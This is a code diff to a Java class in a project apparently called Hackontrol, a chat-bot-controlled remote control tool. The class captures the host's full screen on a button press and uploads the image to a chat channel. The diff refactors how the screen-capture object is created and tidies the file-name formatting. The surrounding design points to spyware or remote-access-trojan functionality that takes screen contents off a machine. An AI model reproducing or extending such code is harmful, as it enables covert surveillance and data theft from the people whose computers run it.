@@ -1,6 +1,5 @@
 package com.khopan.hackontrol.channel;
 
-import java.awt.Dimension;
 import java.awt.Rectangle;
 import java.awt.Robot;
 import java.awt.Toolkit;
@@ -27,22 +26,7 @@ public class ScreenshotChannel extends HackontrolChannel {
 
 	private static final Button BUTTON_SCREENSHOT = ButtonManager.staticButton(ButtonStyle.SUCCESS, "Screenshot", "screenshot");
 
-	private final Robot robot;
-
-	private Throwable Errors;
-
-	public ScreenshotChannel() {
-		Robot robot;
-
-		try {
-			robot = new Robot();
-		} catch(Throwable Errors) {
-			robot = null;
-			this.Errors = Errors;
-		}
-
-		this.robot = robot;
-	}
+	private Robot robot;
 
 	@Override
 	public String getName() {
@@ -56,42 +40,29 @@ public class ScreenshotChannel extends HackontrolChannel {
 
 	@Override
 	public void register(Registry registry) {
-		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ScreenshotChannel.BUTTON_SCREENSHOT, this :: screenshot);
+		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ScreenshotChannel.BUTTON_SCREENSHOT, this :: buttonScreenshot);
 	}
 
-	private void screenshot(ButtonContext context) {
-		if(this.robot == null) {
-			HackontrolError.throwable(context.reply(), this.Errors);
-			return;
-		}
-
-		Dimension size = Toolkit.getDefaultToolkit().getScreenSize();
-		BufferedImage image = this.robot.createScreenCapture(new Rectangle(size));
-		ByteArrayOutputStream stream = new ByteArrayOutputStream();
-
+	private void buttonScreenshot(ButtonContext context) {
 		try {
+			if(this.robot == null) {
+				this.robot = new Robot();
+			}
+
+			BufferedImage image = this.robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
+			ByteArrayOutputStream stream = new ByteArrayOutputStream();
 			ImageIO.write(image, "png", stream);
+			context.replyFiles(FileUpload.fromData(stream.toByteArray(), ScreenshotChannel.getScreenshotFileName())).addActionRow(ScreenshotChannel.BUTTON_SCREENSHOT, HackontrolButton.delete()).queue(ButtonManager :: dynamicButtonCallback);
 		} catch(Throwable Errors) {
-			HackontrolError.throwable(context.reply(), this.Errors);
+			HackontrolError.throwable(context.reply(), Errors);
 			return;
 		}
-
-		byte[] byteArray = stream.toByteArray();
-		context.replyFiles(FileUpload.fromData(byteArray, ScreenshotChannel.getScreenshotFileName())).addActionRow(ScreenshotChannel.BUTTON_SCREENSHOT, HackontrolButton.delete()).queue(ButtonManager :: dynamicButtonCallback);
 	}
 
 	private static String getScreenshotFileName() {
 		try {
 			Calendar calendar = Calendar.getInstance();
-			return String.format("screenshot-%04d_%02d_%02d-%02d_%02d_%02d_%03d.png",
-					calendar.get(Calendar.YEAR),
-					calendar.get(Calendar.MONTH) + 1,
-					calendar.get(Calendar.DAY_OF_MONTH),
-					calendar.get(Calendar.HOUR_OF_DAY),
-					calendar.get(Calendar.MINUTE),
-					calendar.get(Calendar.SECOND),
-					calendar.get(Calendar.MILLISECOND)
-					);
+			return String.format("screenshot-%04d_%02d_%02d-%02d_%02d_%02d_%03d.png", calendar.get(Calendar.YEAR), calendar.get(Calendar.MONTH) + 1, calendar.get(Calendar.DAY_OF_MONTH), calendar.get(Calendar.HOUR_OF_DAY), calendar.get(Calendar.MINUTE), calendar.get(Calendar.SECOND), calendar.get(Calendar.MILLISECOND));
 		} catch(Throwable Errors) {
 			return "screenshot.png";
 		}
